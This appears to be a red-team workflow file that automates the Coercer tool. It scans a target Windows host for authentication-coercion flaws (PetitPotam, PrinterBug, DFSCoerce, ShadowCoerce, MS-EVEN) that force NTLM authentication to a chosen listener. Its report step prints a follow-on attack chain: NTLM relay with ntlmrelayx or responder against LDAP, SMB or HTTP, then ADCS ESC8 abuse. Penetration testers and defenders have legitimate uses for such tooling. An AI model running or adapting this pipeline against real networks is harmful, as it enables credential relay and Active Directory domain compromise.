name: coerce-scan
description: |
  Authentication coercion scanner — uses Coercer to discover vulnerable
  RPC functions that can force a target machine to authenticate to a
  listener (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, etc.).
tags: [redteam, ad, coerce, ntlm, relay, petitpotam, task]
dispatch:
  inputs:
    target:
      required: true
      type: string
      description: Target machine IP or hostname to coerce
      alias: t
    listener:
      required: true
      type: string
      description: Listener IP to receive coerced authentication
    domain:
      type: string
      default: ''
      description: Domain name (for authenticated scan)
    user:
      type: string
      default: ''
      description: Domain username (for authenticated scan)
    password:
      type: string
      default: ''
      description: Password (for authenticated scan)

jobs:
  scan:
    name: Coercion Vector Scan
    outputs:
      vuln_count: '{{ steps["scan-summary"].outputs.vuln_count | default("", true) }}'
    steps:
      - task: coercer
        name: coercer-scan
        with:
          target: "{{ inputs.target }}"
          mode: scan
          listener: "{{ inputs.listener }}"
          username: "{{ inputs.user }}"
          password: "{{ inputs.password }}"
          domain: "{{ inputs.domain }}"
          always_continue: true
        continue-on-error: true
        log-stdout: true
        log-command: true
      - name: scan-summary
        script: |
          vulns = {{ vulns(steps["coercer-scan"].outputs.typed_outputs) | tojson }}
          tags = {{ tags(steps["coercer-scan"].outputs.typed_outputs) | tojson }}

          methods = set()
          protocols = set()
          for v in vulns:
              vname = v.get('name', '')
              if vname:
                  methods.add(vname)
              for tag in v.get('tags', []):
                  protocols.add(tag)

          for t in tags:
              cat = t.get('category', '')
              if cat:
                  protocols.add(cat)

          add_outputs(vuln_count=len(vulns), method_count=len(methods))
          print(f"[+] Found {len(vulns)} vulnerable coercion methods")

  report:
    name: Coercion Report
    needs: [scan]
    steps:
      - name: coercion-report
        script: |
          vuln_count = '{{ jobs.scan.outputs.vuln_count }}'

          known_coercions = {
              'PetitPotam': 'EfsRpcOpenFileRaw — force NTLM auth via MS-EFSR',
              'PrinterBug': 'RpcRemoteFindFirstPrinterChangeNotification — via MS-RPRN',
              'DFSCoerce': 'NetrDfsRemoveStdRoot — via MS-DFSNM',
              'ShadowCoerce': 'IsPathShadowCopied — via MS-FSRVP',
              'MSEven': 'ElfrOpenBELW — via MS-EVEN',
          }

          print("=" * 60)
          print(" AUTHENTICATION COERCION SCAN REPORT")
          print("=" * 60)
          print(f"  Target:     {{ inputs.target }}")
          print(f"  Listener:   {{ inputs.listener }}")
          print(f"  Vulnerable: {vuln_count} methods")
          print("-" * 60)

          print("\n  --- Known Coercion Techniques ---")
          for name, desc in known_coercions.items():
              print(f"  {name}: {desc}")

          if int(vuln_count or 0) > 0:
              print("\n  [!] Next steps:")
              print("      1. Start ntlmrelayx or responder on listener")
              print("      2. Use 'coercer coerce' to trigger authentication")
              print("      3. Relay captured auth to target services (LDAP, SMB, HTTP)")
              print("      4. Combine with ADCS ESC8 for certificate-based PtH")
          else:
              print("\n  [*] No coercion vectors found — target may be patched")
              print("      Try authenticated scan with domain credentials")
        log-stdout: true
